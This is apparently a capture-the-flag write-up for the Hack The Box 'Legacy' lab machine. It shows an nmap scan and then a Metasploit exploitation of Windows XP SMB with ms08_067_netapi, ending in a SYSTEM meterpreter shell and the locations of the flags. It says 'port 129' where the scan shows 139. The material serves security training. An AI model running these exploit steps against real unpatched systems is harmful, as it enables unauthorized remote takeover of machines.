# Legacy machine

## Initial scan

```sh
sudo nmap -A -T5 -p- 10.10.10.4
```

Result
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 02:09 EDT
Nmap scan report for 10.10.10.4
Host is up (0.074s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (92%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h58m46s, deviation: 1h24m51s, median: -4h58m46s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f6:5f (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-03-15T05:12:29+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   73.97 ms 10.10.14.1
2   74.71 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.70 seconds
```

We have 2 ports, 1 service. Port 129 and port 445. Mostly about SMB. Lets try to exploit this.

## SMB scan

First, let's find out the SMB version that this box is running

```sh
msfconsole
msf5 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


msf5 > use auxiliary/scanner/smb/smb_version 
```

A quick google for Windows XP SP3 SMB exploit rapid-7 gives us [rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

## Exploitation

We now attempt to exploit the machine

```sh
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show targets
msf exploit(ms08_067_netapi) > set TARGET 7
msf exploit(ms08_067_netapi) > show options
msf exploit(ms08_067_netapi) > set rhosts 10.10.10.4
msf exploit(ms08_067_netapi) > run
```

We get back a meterpreter shell. Let's first take a look at who we are
```sh
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
# Computer        : LEGACY
# OS              : Windows XP (5.1 Build 2600, Service Pack 3).
# Architecture    : x86
# System Language : en_US
# Domain          : HTB
# Logged On Users : 1
# Meterpreter     : x86/windows
```


Taking a look around with the shell, the flags are found at `C:\Documents and Settings\john\Desktop>` and `C:\Documents and Settings\Administrator\Desktop` with the command `type user.txt`
